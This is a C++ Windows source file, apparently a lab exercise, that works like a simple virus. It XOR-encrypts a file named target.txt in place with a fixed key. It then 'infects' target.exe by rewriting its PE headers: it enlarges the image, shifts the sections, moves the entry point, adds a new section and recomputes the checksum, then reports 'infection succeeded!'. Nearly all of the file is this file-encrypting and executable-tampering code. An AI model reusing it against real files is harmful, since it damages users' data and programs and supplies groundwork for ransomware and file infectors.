#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <windows.h>
#include <string>
#include <iomanip>
#include <imagehlp.h>
#pragma comment(lib,"imagehlp.lib")

using namespace std;

HANDLE hFile;
HANDLE hMapping;
LPVOID pMapping;


// 对指定文件进行异或加密
void xorEncrypt(const string& filePath, char key) {
    // 打开文件，读取文件内容
    ifstream inputFile(filePath, ios::binary);
    if (!inputFile.is_open()) {
        cout << "Unable to open the file!" << endl;
        return;
    }

    // 读取文件内容到一个vector中
    vector<char> fileContent((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());
    inputFile.close();

    // 对文件内容进行异或加密
    for (auto& byte : fileContent) {
        byte ^= key;
    }

    // 将加密后的内容写回文件
    ofstream outputFile(filePath, ios::binary);
    if (!outputFile.is_open()) {
        cout << "Unable to write back!" << endl;
        return;
    }

    outputFile.write(fileContent.data(), fileContent.size());
    outputFile.close();

    cout << "Encryption succeeded!" << endl;
}
void infectPE(){
hFile = CreateFile(TEXT("target.exe"),
        GENERIC_READ | GENERIC_WRITE,     // no access to the drive
        FILE_SHARE_READ | // share mode
        FILE_SHARE_WRITE,
        NULL,             // default security attributes
        OPEN_EXISTING,    // disposition
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );


    //将PE文件映射到内存
    //hMapping作为返回值代表的是这一段文件内容内存中的起始地址
    //要获取它的数据需要转换为BYTE*或者UNINT8*型指针
    hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0x20000, NULL);
    if (!hMapping) {
        return ;
    }

    pMapping = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0x20000);
    //返回的是map的开始地址
    if (!pMapping) {
        return ;
    }

    //获取DOS header:
    PIMAGE_DOS_HEADER dosheader;
    //PIMAGE_DOS_HEADER是IMAGE_DOS_HEADER的结构体指针
    dosheader = (PIMAGE_DOS_HEADER)pMapping;
 
    PIMAGE_NT_HEADERS nt_header;
    nt_header = (PIMAGE_NT_HEADERS)((BYTE*)pMapping + dosheader->e_lfanew);
    cout << "checkSum:" << nt_header->OptionalHeader.CheckSum << endl;

    //1.将SizeOfImage增加一个SectionAlignment的大小
    //记录旧的SizeOfImage
    DWORD OldSizeOfImage = nt_header->OptionalHeader.SizeOfImage;
    nt_header->OptionalHeader.SizeOfImage += 0x1000;

    //2.将节表后面的内容整体向后移动200h
    //获取第一个节表项
    PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(nt_header);

    //第一个节的起始地址
    DWORD firstPt = firstSection->PointerToRawData;
    // cout << "第一个节的起始地址:" << hex << firstPt << endl;

    //需要移动的区域为旧的SizeOfImage减去第一个节的VA

    DWORD sizeToMove = 0x17000 - firstPt;
    // cout << "需要移动的内容大小:" << hex << sizeToMove << endl;

    //将AddressOfEntryPoint加1000h
    nt_header->OptionalHeader.AddressOfEntryPoint += 0x1000;

    //将节表中除了.bss项，其余的VA都+1000h，PointerToRawData+200h
    for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_header) + i;
        // 检查节名是否为 ".bss"
        if (strncmp((char*)section->Name, ".bss", 4) != 0) {
            // 如果不是 .bss 节，则增加 VA 和 PointerToRawData
            /*cout << "节表项" << i << "不是.bss节" << endl;*/
            section->VirtualAddress += 0x1000;  // 增加 VA (虚拟地址)
            section->PointerToRawData += 0x200; // 增加 PointerToRawData (文件偏移)
        }
    }
    // cout << "节表项除了.bss的VA和PointerToRawData均已修改!" << endl;


    //开始移动
    //WORD originalWord = *((WORD*)((BYTE*)pMapping + firstPt+0x200));
    //cout << "移动前的 WORD 内容: 0x" << hex << originalWord << endl;
    memmove((BYTE*)pMapping + firstPt + 0x200, (BYTE*)pMapping + firstPt, sizeToMove);
    memset((BYTE*)pMapping + firstPt, 0, 0x200);  // 从0x400偏移开始填充200h字节为0
    // cout << "已整体迁移!" << endl;
    //WORD newWord = *((WORD*)((BYTE*)pMapping + firstPt+0x200));
    //cout << "移动后的 WORD 内容: 0x" << hex << newWord << endl;

    //移动完后，开始向节表项中新增一项
    nt_header->FileHeader.NumberOfSections += 1;
    //准备新的节表项
    PIMAGE_SECTION_HEADER newSection = IMAGE_FIRST_SECTION(nt_header) + nt_header->FileHeader.NumberOfSections - 1;
    memcpy(newSection->Name, ".newsec", 8);//新节名称
    newSection->Misc.VirtualSize = 0x1000;
    newSection->VirtualAddress = OldSizeOfImage;
    newSection->SizeOfRawData = 0x200;
    newSection->PointerToRawData = 0x17000;
    newSection->PointerToRelocations = 0;
    newSection->PointerToLinenumbers = 0;
    newSection->NumberOfRelocations = 0;
    newSection->NumberOfLinenumbers = 0;
    newSection->Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;


    
    //修改checkSum
    DWORD HeaderCheckSum = nt_header->OptionalHeader.CheckSum;   //PE头里的校验值(内存中的值)
    nt_header->OptionalHeader.CheckSum = 0;
    DWORD CheckSum = 0;
    //计算校验值
    MapFileAndCheckSum(TEXT("target.exe"), &HeaderCheckSum, &CheckSum);
    nt_header->OptionalHeader.CheckSum = CheckSum;//修改checkSum
    // cout << "修改后的CheckSum为:" << nt_header->OptionalHeader.CheckSum << endl << endl;
    /*将map给flush回原文件*/
    FlushViewOfFile(pMapping, 0);
    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    cout<<"infection succeeded!"<<endl;


}

int main() {
    char ownPath[MAX_PATH];
    GetModuleFileNameA(NULL, ownPath, MAX_PATH);

    // 手动移除文件名，保留目录
    std::string path(ownPath);
    size_t lastSlash = path.find_last_of("/\\");
    if (lastSlash != std::string::npos) {
        path = path.substr(0, lastSlash);
        SetCurrentDirectoryA(path.c_str());
    }

    string filePath = "target.txt";
    char key = 0x66;

    // 调用加密函数
    xorEncrypt(filePath, key);

    //调用感染函数
    infectPE();

    return 0;
}
